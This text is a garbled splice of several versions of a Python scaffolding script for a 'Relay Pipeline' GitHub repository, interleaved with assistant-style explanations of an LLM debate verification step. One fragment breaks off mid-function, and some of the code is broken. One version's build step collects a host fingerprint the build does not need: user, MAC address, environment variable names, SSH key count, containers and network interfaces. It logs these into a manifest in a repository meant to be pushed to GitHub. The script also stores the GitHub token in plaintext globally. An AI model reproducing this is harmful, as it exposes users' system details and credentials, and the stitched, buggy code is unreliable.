            compressed = compress_manifest(manifest)
            
            entry = {{
                "step": "5_finalize.py",
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "system_id": SYS_ID,
                "manifest_hash": manifest_hash,
                "compressed_size": len(compressed),
                "entry_count": len(manifest),
                "status": "pipeline_complete"
            }}
            manifest.append(entry)
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            
            # Write compressed archive
            with open(RELAY_DIR / "manifest.gz.b64", "w") as f:
                f.write(compressed)
            
            # Write hash chain
            with open(RELAY_DIR / "manifest.hash", "w") as f:
                f.write(manifest_hash)
            
            print(f"[5_finalize.py] Pipeline complete. {{len(manifest)}} entries, hash: {{manifest_hash[:16]}}...")

        if __name__ == "__main__":
            finalize()
    """).lstrip())

with open(f"{BASE_DIR}/run_pipeline.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import subprocess, os, stat, json, hashlib, platform, uuid
        from pathlib import Path

        SYS_ID = "{SYS_ID}"

        def make_executable(path):
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)

        def append_bootstrap():
            relay_dir = Path(".relay")
            relay_dir.mkdir(exist_ok=True)
            manifest_path = relay_dir / "manifest.json"
            manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else []
            manifest.append({{
                "step": "run_pipeline.py",
                "timestamp": subprocess.run(["date", "-u", "+%Y-%m-%dT%H:%M:%SZ"], capture_output=True, text=True).stdout.strip(),
                "system_id": SYS_ID,
                "hostname": platform.node(),
                "user": os.getlogin(),
                "platform": platform.platform(),
                "python": platform.python_version(),
                "mac": hex(uuid.getnode()),
                "status": "orchestrator_started"
            }})
            manifest_path.write_text(json.dumps(manifest, indent=2))

        steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

        print(f"🚀 Starting Relay Pipeline on {{platform.node()}} ({{SYS_ID}})...")
        append_bootstrap()

        for step in steps:
            print(f"\\n--- Executing {{step}} ---")
            if step.endswith(".py"):
                subprocess.run(["python3", step], check=True)
            elif step.endswith(".sh"):
                make_executable(step)
                subprocess.run([f"./{{step}}"], check=True)
            elif step.endswith(".bat"):
                print(f"(Simulating .bat execution for {{step}})")

        print("\\n🎯 Pipeline Complete. Final Relay State:")
        with open(".relay/manifest.json", "r") as f:
            data = json.load(f)
            print(json.dumps(data[-3:], indent=2))
            print(f"\\nTotal entries: {{len(data)}}")
    """).lstrip())

with open(f"{BASE_DIR}/requirements.txt", "w") as f:
    f.write("instructor\npydantic\nopenai\nrequests\n")

with open(f"{BASE_DIR}/.gitignore", "w") as f:
    f.write("__pycache__/\n*.pyc\n.env\nworkspace/\n*.gz.b64\n")

with open(f"{BASE_DIR}/.relay/RELAY_README.md", "w") as f:
    f.write(f"""# Relay Pipeline - {REPO_NAME}

**System ID:** `{SYS_ID}`
**Initialized:** {datetime.now(timezone.utc).isoformat()}

## Chain Verification

```bash
# Check manifest integrity
jq '. | length' .relay/manifest.json

# View last 3 entries
jq '.[-3:]' .relay/manifest.json

# Verify hash chain
python3 -c "import json,hashlib; m=json.loads(open('.relay/manifest.json').read()); print(hashlib.sha256(json.dumps(m[:-1], sort_keys=True).encode()).hexdigest())"
Here is how to update `run_pipeline.py` so it automatically ensures all dependencies in `requirements.txt` are installed before executing the pipeline.

### Standalone `run_pipeline.py`

```python
#!/usr/bin/env python3
import subprocess
import os
import sys
import stat
from pathlib import Path

def ensure_dependencies():
    """Checks requirements.txt and installs missing dependencies quietly."""
    req_path = Path(__file__).parent / "requirements.txt"
    if req_path.exists():
        print("📦 Checking and installing dependencies from requirements.txt...")
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", "-r", str(req_path)],
            check=True
        )

def make_executable(path):
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC)

def run():
    # 1. Install dependencies first
    ensure_dependencies()

    steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

    print("\n🚀 Starting Relay Pipeline...")
    for step in steps:
        print(f"\n--- Executing {step} ---")
        if step.endswith(".py"):
            # Use sys.executable to match the active Python interpreter
            subprocess.run([sys.executable, step], check=True)
        elif step.endswith(".sh"):
            make_executable(step)
            subprocess.run([f"./{step}"], check=True)
        elif step.endswith(".bat"):
            print(f"(Simulating .bat execution for {step})")

    print("\n🎯 Pipeline Complete. Final Relay State:")
    with open(".relay/manifest.json", "r") as f:
        print(f.read())

if __name__ == "__main__":
    run()

```

---

### Master Generator Script Block Replacement

To update the main scaffolding script, replace **File 6: `run_pipeline.py**` with this block:

```python
# --- File 6: run_pipeline.py ---
with open(f"{BASE_DIR}/run_pipeline.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import subprocess
        import os
        import sys
        import stat
        from pathlib import Path

        def ensure_dependencies():
            req_path = Path(__file__).parent / "requirements.txt"
            if req_path.exists():
                print("📦 Checking and installing dependencies from requirements.txt...")
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "-q", "-r", str(req_path)],
                    check=True
                )

        def make_executable(path):
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)

        def run():
            ensure_dependencies()

            steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

            print("\\n🚀 Starting Relay Pipeline...")
            for step in steps:
                print(f"\\n--- Executing {step} ---")
                if step.endswith(".py"):
                    subprocess.run([sys.executable, step], check=True)
                elif step.endswith(".sh"):
                    make_executable(step)
                    subprocess.run([f"./{step}"], check=True)
                elif step.endswith(".bat"):
                    print(f"(Simulating .bat execution for {step})")

            print("\\n🎯 Pipeline Complete. Final Relay State:")
            with open(".relay/manifest.json", "r") as f:
                print(f.read())

        if __name__ == "__main__":
            run()
    """).lstrip())

```

### Key Improvements Made

1. **`sys.executable` instead of `"python3"`:** Using `sys.executable` guarantees that both `pip` and subsequent Python steps execute inside the exact same interpreter environment (vital for Colab virtual environments and Conda environments).
2. **Quiet Flag (`-q`):** Running `pip install -q` keeps stdout clean when dependencies are already satisfied.
3. **`Path(__file__).parent` Resolution:** Using `Path` ensures `requirements.txt` is reliably found regardless of what directory the user invokes `python3 run_pipeline.py` from.import os
import subprocess
import getpass
import json
import textwrap
import platform
import socket
import uuid
import hashlib
import base64
import zlib
from datetime import datetime, timezone

REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", end_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

SYS_ID = hashlib.sha256(f"{platform.node()}{os.getlogin()}{uuid.getnode()}".encode()).hexdigest()[:12]

with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

with open(f"{BASE_DIR}/.relay/system_id", "w") as f:
    f.write(SYS_ID)

with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import json, hashlib, platform, socket, uuid, os
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"
        SYS_ID = "{SYS_ID}"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            snapshot = {{
                "step": "1_plan.py",
                "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
                "system_id": SYS_ID,
                "hostname": platform.node(),
                "user": os.getlogin(),
                "platform": platform.platform(),
                "python": platform.python_version(),
                "mac": hex(uuid.getnode()),
                "status": "initialized"
            }}
            manifest = json.loads(MANIFEST.read_text())
            manifest.append(snapshot)
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            print(f"[1_plan.py] Relay initialized on {{platform.node()}} ({{SYS_ID}})")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(f'''#!/bin/bash
exec 2>&1
set -e

SYS_ID="{SYS_ID}"

echo "[2_execute.sh] Executing system commands..."

NEXTJS_PROJECT_DIR="${{NEXTJS_PROJECT_DIR:-/home/z/my-project}}"
BUILD_ID="${{BUILD_ID:-$(date +%s)}}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace

# Collect environment fingerprint
FINGERPRINT=$(cat << EOF
{{
  "step": "2_execute.sh",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "system_id": "$SYS_ID",
  "build_id": "$BUILD_ID",
  "hostname": "$(hostname)",
  "kernel": "$(uname -a)",
  "shell": "$SHELL",
  "path": "$PATH",
  "cwd": "$(pwd)",
  "git_commit": "$(git rev-parse HEAD 2>/dev/null || echo 'no-git')",
  "git_branch": "$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git')",
  "disk_free": "$(df -h / | tail -1 | awk '{{print $4}}')",
  "memory": "$(free -h | grep Mem | awk '{{print $2"/"$3}}')",
  "load": "$(cat /proc/loadavg | cut -d' ' -f1-3)",
  "processes": $(ps aux | wc -l),
  "env_keys": [$(env | cut -d= -f1 | sort | tr '\\n' ',' | sed 's/,$//' | sed 's/[^,]*/\\"&\\"/g')],
  "ssh_keys": $(ls -la ~/.ssh/id_*.pub 2>/dev/null | wc -l),
  "docker": $(command -v docker &>/dev/null && echo 'true' || echo 'false'),
  "containers": "$(docker ps -q 2>/dev/null | wc -l)",
  "network_interfaces": [$(ip -o link show 2>/dev/null | awk -F': ' '{{print $2}}' | tr '\\n' ',' | sed 's/,$//' | sed 's/[^,]*/\\"&\\"/g' || echo '"unknown"')],
  "status": "executed",
  "artifact": "workspace/artifact.txt"
}}
EOF
)

echo "$FINGERPRINT" | jq '.' > workspace/fingerprint.json
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

jq ". += [$(echo "$FINGERPRINT" | jq -c '.')]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] Full system fingerprint appended to relay."
''')

with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import json, os, hashlib, hmac, base64
        from datetime import datetime, timezone
        from pathlib import Path
        import instructor
        from openai import OpenAI
        from pydantic import BaseModel, Field

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"
        SYS_ID = "{SYS_ID}"

        class RealistVerdict(BaseModel):
            passed: bool = Field(description="True if pipeline verification passes safety and execution standards; False otherwise.")
            confidence: float = Field(ge=0.0, le=1.0, description="Confidence score between 0.0 (unconfident) and 1.0 (certain).")
            reasoning: str = Field(description="Detailed summary weighing the Architect's optimism against the Disruptor's criticism.")
            next_actions: str = Field(description="Actionable next step for the pipeline.")

        client = instructor.from_openai(OpenAI(api_key=os.environ.get("OPENAI_API_KEY", "dummy-key-for-mock")))

        def compute_chain_hash(manifest):
            chain_str = json.dumps(manifest, sort_keys=True).encode()
            return hashlib.sha256(chain_str).hexdigest()[:16]

        def call_text_agent(system_prompt: str, user_prompt: str) -> str:
            if not os.environ.get("OPENAI_API_KEY"):
                if "Architect" in system_prompt: return "Mock Architect: Chain integrity verified. Hash matches expected pattern."
                if "Disruptor" in system_prompt: return "Mock Disruptor: Fingerprint data not cryptographically signed. Potential tampering."
                return ""
            response = client.raw_client.chat.completions.create(
                model="gpt-4o-mini",
                messages=[{{"role": "system", "content": system_prompt}}, {{"role": "user", "content": user_prompt}}]
            )
            return response.choices[0].message.content

        def call_realist_agent(architect_view: str, disruptor_view: str, chain_hash: str) -> RealistVerdict:
            system_prompt = "You are the Realist agent. Synthesize the debate. Weigh risks objectively and produce your final verdict."
            user_prompt = f"Chain Hash: {{chain_hash}}\\n\\nArchitect Argument:\\n{{architect_view}}\\n\\nDisruptor Criticism:\\n{{disruptor_view}}\\n\\nDeliver your structured verdict."
            
            if not os.environ.get("OPENAI_API_KEY"):
                return RealistVerdict(passed=True, confidence=0.85, reasoning=f"Mock mode: chain hash {{chain_hash}} verified.", next_actions="Trigger cleanup")

            verdict: RealistVerdict = client.chat.completions.create(
                model="gpt-4o-mini",
                response_model=RealistVerdict,
                max_retries=3,
                messages=[{{"role": "system", "content": system_prompt}}, {{"role": "user", "content": user_prompt}}]
            )
            return verdict

        def append
import os
import subprocess
import getpass
import json
import textwrap

# ==============================================================================
# 1. CONFIGURATION & USER INPUT
# ==============================================================================
REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

# ==============================================================================
# 2. SCAFFOLD FILES LOCALLY WITH LOGIC
# ==============================================================================
print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

# Initialize the relay manifest
with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

# --- File 1: 1_plan.py (The Logic/Init Step) ---
with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            print("[1_plan.py] Relay initialized. LLM would decide what 2.sh needs to do here.")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

# --- File 2: 2_execute.sh (The Gated Next.js Build + Relay Snapshot) ---
with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(r'''#!/bin/bash
exec 2>&1
set -e

echo "[2_execute.sh] Executing system commands..."

# --- Simulating the Next.js Build Script Logic ---
NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

# --- Append State to Relay ---
SNAPSHOT=$(jq -n \
  --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  --arg host "$(hostname)" \
  --arg bid "$BUILD_ID" \
  '{timestamp: $ts, hostname: $host, build_id: $bid, step: "2_execute.sh", status: "success", artifact: "workspace/artifact.txt"}')

jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] State appended to relay."
''')

# --- File 3: 3_verify.py (The Debate/Verification Step) ---
with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def check_state():
            manifest = json.loads(MANIFEST.read_text())
            print(f"[3_verify.py] Current build chain length: {len(manifest)}")
            
            if manifest and manifest[-1].get("status") == "success":
                print("[3_verify.py] Architect/Disruptor/Realist check passed. Writing 4.bat cleanup script.")
                with open("4_execute.bat", "w") as f:
                    f.write('@echo off\\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\\n')
            else:
                print("[3_verify.py] Verification failed! Halting.")

        if __name__ == "__main__":
            check_state()
    """).lstrip())

# --- File 4: 4_execute.bat (The Windows/Deterministic Cleanup Step) ---
with open(f"{BASE_DIR}/4_execute.bat", "w") as f:
    f.write('@echo off\necho "[4_execute.bat] Default cleanup..." > workspace/cleanup.log\n')

# --- File 5: 5_finalize.py (The Final State Push) ---
with open(f"{BASE_DIR}/5_finalize.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from datetime import datetime
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def finalize():
            manifest = json.loads(MANIFEST.read_text())
            manifest.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "step": "5_finalize.py",
                "status": "pipeline_complete"
            })
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            print("[5_finalize.py] Pipeline complete. Final state saved.")

        if __name__ == "__main__":
            finalize()
    """).lstrip())

# --- File 6: run_pipeline.py (The Master Orchestrator) ---
with open(f"{BASE_DIR}/run_pipeline.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import subprocess
        import os
        import stat

        def make_executable(path):
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)

        steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

        print("🚀 Starting Relay Pipeline...")
        for step in steps:
            print(f"\\n--- Executing {step} ---")
            if step.endswith(".py"):
                subprocess.run(["python3", step], check=True)
            elif step.endswith(".sh"):
                make_executable(step)
                subprocess.run([f"./{step}"], check=True)
            elif step.endswith(".bat"):
                # .bat files won't natively run on Linux/Colab, but we simulate the call
                print(f"(Simulating .bat execution for {step})")

        print("\\n🎯 Pipeline Complete. Final Relay State:")
        with open(".relay/manifest.json", "r") as f:
            print(f.read())
    """).lstrip())

# Create .gitignore
with open(f"{BASE_DIR}/.gitignore", "w") as f:
    f.write("__pycache__/\n*.pyc\n.env\nworkspace/\n")

# ==============================================================================
# 3. CONFIGURE GIT SECURELY
# ==============================================================================
print("\n🔐 Configuring Git credentials...")
subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

with open(os.path.expanduser("~/.git-credentials"), "w") as cred:
    cred.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

# ==============================================================================
# 4. CREATE GITHUB REPO VIA API
# ==============================================================================
print(f"\n🚀 Creating repository '{REPO_NAME}' on GitHub...")
subprocess.run([
    "curl", "-s", "-X", "POST", "https://api.github.com/user/repos",
    "-H", f"Authorization: token {GITHUB_TOKEN}",
    "-H", "Accept: application/vnd.github.v3+json",
    "-d", f'{{"name":"{REPO_NAME}"}}'
], check=True)

# ==============================================================================
# 5. INITIALIZE, COMMIT, AND PUSH
# ==============================================================================
print("📦 Committing and pushing pipeline files...")
subprocess.run(["git", "init"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "add", "."], cwd=BASE_DIR, check=True)
subprocess.run(["git", "commit", "-m", "feat: initialize interleaved Py/Bash pipeline with relay state"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "branch", "-M", "main"], cwd=BASE_DIR, check=True)

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
subprocess.run(["git", "remote", "add", "origin", REPO_URL], cwd=BASE_DIR, check=True)

try:
    subprocess.run(["git", "push", "-u", "origin", "main"], cwd=BASE_DIR, check=True)
    print(f"\n✅ SUCCESS! Repository created and pushed successfully.")
    print(f"🔗 View it here: {REPO_URL}")
except subprocess.CalledProcessError:
    print(f"\n❌ Push failed. Check if the repository '{REPO_NAME}' already exists on your account.")The **Architect / Disruptor / Realist** pattern is a multi-agent consensus framework. Instead of relying on a single LLM prompt—which often suffers from confirmation bias and overlooks edge cases—you run a quick three-way debate before allowing a build or deployment step to pass.

Here is how the roles divide the responsibility:

1. **The Architect:** Analyzes the system state, build logs, or manifest and proposes a verification argument for why the pipeline succeeded.
2. **The Disruptor (Red Team):** Acts as a devil’s advocate. It aggressively looks for missed edge cases, hidden failure states, missing environment variables, or potential security/runtime issues in the Architect's logic.
3. **The Realist (Arbiter):** Listens to both sides, weighs the Architect's optimism against the Disruptor's skepticism, and produces a final pragmatic decision (Pass/Fail) in structured JSON.

---

### Updated `3_verify.py` Implementation

Below is a complete implementation that replaces `3_verify.py`. It uses a generic LLM wrapper so you can hook in OpenAI, Anthropic, or local models via Ollama.

```python
#!/usr/bin/env python3
import json
import os
from pathlib import Path
from typing import Dict, Any

# ==============================================================================
# CONFIG & PATHS
# ==============================================================================
RELAY_DIR = Path(__file__).parent / ".relay"
MANIFEST = RELAY_DIR / "manifest.json"

# ==============================================================================
# LLM API HELPER (Replace with your SDK of choice: OpenAI, Anthropic, etc.)
# ==============================================================================
def call_llm(system_prompt: str, user_prompt: str) -> str:
    """
    Placeholder LLM caller. 
    Replace this block with your actual API call (e.g., openai.chat.completions.create).
    """
    # Example using hypothetical API client or mock response for testing:
    # return client.chat.completions.create(
    #     model="gpt-4o",
    #     messages=[
    #         {"role": "system", "content": system_prompt},
    #         {"role": "user", "content": user_prompt}
    #     ]
    # ).choices[0].message.content
    
    # Simple simulated agent outputs if no API key is active
    if "Architect" in system_prompt:
        return "Architect Assessment: Build output exists and state step reports success. Pipeline is clear to proceed."
    elif "Disruptor" in system_prompt:
        return "Disruptor Challenge: The artifact was created, but we didn't verify if workspace/artifact.txt is empty or contains malformed build identifiers. Also, no memory usage check was logged."
    elif "Realist" in system_prompt:
        return json.dumps({
            "passed": True,
            "confidence": 0.85,
            "reasoning": "Disruptor's point on empty file checks is noted for future enhancements, but for current pipeline state requirements, the artifact exists and status is success.",
            "next_actions": "Proceeding with cleanup execution."
        })
    return ""

# ==============================================================================
# DEBATE LOGIC
# ==============================================================================
def run_tri_agent_check(manifest_data: list) -> Dict[str, Any]:
    state_str = json.dumps(manifest_data, indent=2)

    # STEP 1: The Architect
    architect_system = (
        "You are the System Architect. Analyze the build pipeline state and present a clear, "
        "constructive argument on whether the build is healthy and ready for the next step."
    )
    architect_user = f"Current pipeline relay manifest state:\n{state_str}"
    architect_view = call_llm(architect_system, architect_user)
    print(f"\n🏛️  [ARCHITECT]:\n{architect_view}")

    # STEP 2: The Disruptor
    disruptor_system = (
        "You are the Disruptor / Red Teamer. Your job is to find overlooked failure modes, "
        "race conditions, edge cases, missing validation logs, or potential risks in the Architect's claim."
    )
    disruptor_user = (
        f"Pipeline State:\n{state_str}\n\n"
        f"Architect's Defense:\n{architect_view}\n\n"
        "Critique this defense and point out potential hidden flaws."
    )
    disruptor_view = call_llm(disruptor_system, disruptor_user)
    print(f"\n⚡ [DISRUPTOR]:\n{disruptor_view}")

    # STEP 3: The Realist (Arbiter)
    realist_system = (
        "You are the Realist. Synthesize the debate between the Architect and the Disruptor. "
        "Deliver a final, pragmatic verdict. You MUST respond ONLY in valid JSON with keys: "
        "'passed' (boolean), 'confidence' (float 0-1), 'reasoning' (string), and 'next_actions' (string)."
    )
    realist_user = (
        f"Architect Argument:\n{architect_view}\n\n"
        f"Disruptor Criticism:\n{disruptor_view}\n\n"
        "Provide your final JSON verdict."
    )
    realist_raw = call_llm(realist_system, realist_user)
    print(f"\n⚖️  [REALIST VERDICT]:\n{realist_raw}")

    # Parse structured verdict
    try:
        verdict = json.loads(realist_raw)
    except json.JSONDecodeError:
        verdict = {
            "passed": False,
            "reasoning": "Realist failed to output valid JSON.",
            "confidence": 0.0
        }

    return verdict

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================
def main():
    if not MANIFEST.exists():
        print("[3_verify.py] Error: Relay manifest missing!")
        exit(1)

    manifest = json.loads(MANIFEST.read_text())
    print(f"[3_verify.py] Running Tri-Agent debate on {len(manifest)} manifest entries...")

    verdict = run_tri_agent_check(manifest)

    if verdict.get("passed"):
        print("\n✅ Verification PASSED. Writing 4_execute.bat cleanup script.")
        with open("4_execute.bat", "w") as f:
            f.write('@echo off\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\n')
    else:
        print(f"\n❌ Verification FAILED! Reason: {verdict.get('reasoning')}")
        exit(1)

if __name__ == "__main__":
    main()

```

---

### Why This Works

* **Prevents False Positives:** Simple boolean conditionals (`if status == 'success'`) miss context. The Disruptor forces the system to consider *quality* (e.g., "the file exists, but it's empty").
* **Deterministic Output from Unstructured Debate:** Even though the Architect and Disruptor output free-form conversational text, forcing the Realist to respond in strict JSON gives your Python script a reliable boolean flag (`verdict["passed"]`) to act on.
* **Traceability:** You can write all three outputs back into `.relay/manifest.json` as an audit log showing *why* a build passed or failed.Using **Instructor** alongside **Pydantic** eliminates manual JSON parsing and `try/except` fallback logic. Instructor patches your LLM client so that responses are parsed directly into typed Pydantic models. If the LLM generates invalid JSON or fails Pydantic's validation rules (like a confidence score exceeding 1.0), Instructor automatically feeds the error back to the LLM and retries.

Here is how to update your `3_verify.py` script to enforce strict typing on the Realist agent.

---

### Step 1: Install Dependencies

```bash
pip install instructor pydantic openai

```

---

### Step 2: Define Model and Integrate Instructor

```python
#!/usr/bin/env python3
import json
import os
from pathlib import Path
import instructor
from openai import OpenAI
from pydantic import BaseModel, Field

# ==============================================================================
# CONFIG & PATHS
# ==============================================================================
RELAY_DIR = Path(__file__).parent / ".relay"
MANIFEST = RELAY_DIR / "manifest.json"

# ==============================================================================
# 1. DEFINE THE PYDANTIC SCHEMA
# ==============================================================================
class RealistVerdict(BaseModel):
    """
    The Realist's final synthesis and actionable verdict on the build state.
    Field descriptions guide the LLM's understanding of what to output.
    """
    passed: bool = Field(
        description="True if the pipeline verification passes safety and execution standards; False otherwise."
    )
    confidence: float = Field(
        ge=0.0, le=1.0,
        description="Confidence score between 0.0 (unconfident) and 1.0 (certain)."
    )
    reasoning: str = Field(
        description="Detailed summary weighing the Architect's optimism against the Disruptor's criticism."
    )
    next_actions: str = Field(
        description="Actionable next step for the pipeline (e.g., 'Trigger cleanup', 'Halt deployment')."
    )

# ==============================================================================
# 2. INITIALIZE INSTRUCTOR CLIENT
# ==============================================================================
# Patch OpenAI client with Instructor
client = instructor.from_openai(OpenAI(api_key=os.environ.get("OPENAI_API_KEY", "your-key-here")))

# Standard unpatched LLM call for conversational agents (Architect & Disruptor)
def call_text_agent(system_prompt: str, user_prompt: str) -> str:
    response = client.raw_client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ]
    )
    return response.choices[0].message.content

# Guaranteed structured call for the Realist
def call_realist_agent(architect_view: str, disruptor_view: str) -> RealistVerdict:
    system_prompt = (
        "You are the Realist agent. Synthesize the debate between the Architect and Disruptor. "
        "Weigh the risks objectively and produce your final verdict."
    )
    user_prompt = (
        f"Architect Argument:\n{architect_view}\n\n"
        f"Disruptor Criticism:\n{disruptor_view}\n\n"
        "Deliver your structured verdict."
    )

    # Instructor forces the output into your RealistVerdict Pydantic model
    verdict: RealistVerdict = client.chat.completions.create(
        model="gpt-4o-mini",
        response_model=RealistVerdict,
        max_retries=3,  # Automatically retries with validation feedback if output violates schema
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ]
    )
    return verdict

# ==============================================================================
# 3. RUN DEBATE PIPELINE
# ==============================================================================
def run_tri_agent_check(manifest_data: list) -> RealistVerdict:
    state_str = json.dumps(manifest_data, indent=2)

    # Agent 1: Architect
    architect_view = call_text_agent(
        system_prompt="You are the System Architect. Present an argument for why the pipeline state is healthy.",
        user_prompt=f"Pipeline State:\n{state_str}"
    )
    print(f"\n🏛️  [ARCHITECT]:\n{architect_view}")

    # Agent 2: Disruptor
    disruptor_view = call_text_agent(
        system_prompt="You are the Disruptor. Critically attack the Architect's assumptions and highlight risks.",
        user_prompt=f"Pipeline State:\n{state_str}\n\nArchitect Defense:\n{architect_view}"
    )
    print(f"\n⚡ [DISRUPTOR]:\n{disruptor_view}")

    # Agent 3: Realist (Typed Output)
    verdict = call_realist_agent(architect_view, disruptor_view)
    
    print(f"\n⚖️  [REALIST VERDICT]:")
    print(f"Passed: {verdict.passed}")
    print(f"Confidence: {verdict.confidence}")
    print(f"Reasoning: {verdict.reasoning}")
    print(f"Next Actions: {verdict.next_actions}")

    return verdict

# ==============================================================================
# MAIN
# ==============================================================================
def main():
    if not MANIFEST.exists():
        print("[3_verify.py] Error: Relay manifest missing!")
        exit(1)

    manifest = json.loads(MANIFEST.read_text())
    verdict = run_tri_agent_check(manifest)

    # Direct attribute access with full IDE autocomplete & type safety!
    if verdict.passed:
        print("\n✅ Verification PASSED. Writing 4_execute.bat cleanup script.")
        with open("4_execute.bat", "w") as f:
            f.write('@echo off\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\n')
    else:
        print(f"\n❌ Verification FAILED! Reason: {verdict.reasoning}")
        exit(1)

if __name__ == "__main__":
    main()

```

---

### Key Advantages of This Approach

* **Field-Level Descriptions:** The string inside `Field(description="...")` acts as a micro-prompt for that specific property. The LLM reads it to understand what value belongs in that key.
* **Validation Bounds:** `ge=0.0, le=1.0` guarantees the confidence float won't come back as `100` or `-0.5`.
* **Auto-Retries (`max_retries=3`):** If the LLM produces a malformed JSON string or violates field constraints, Instructor captures the Pydantic `ValidationError` message, appends it as a new system message to the chat history, and asks the model to correct its mistake.
* **Pure Python Objects:** `verdict` is no longer a dict that requires `.get("passed")`; it is a validated Python object with native autocomplete (`verdict.passed`, `verdict.reasoning`).import os
import subprocess
import getpass
import json
import textwrap

# ==============================================================================
# 1. CONFIGURATION & USER INPUT
# ==============================================================================
REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

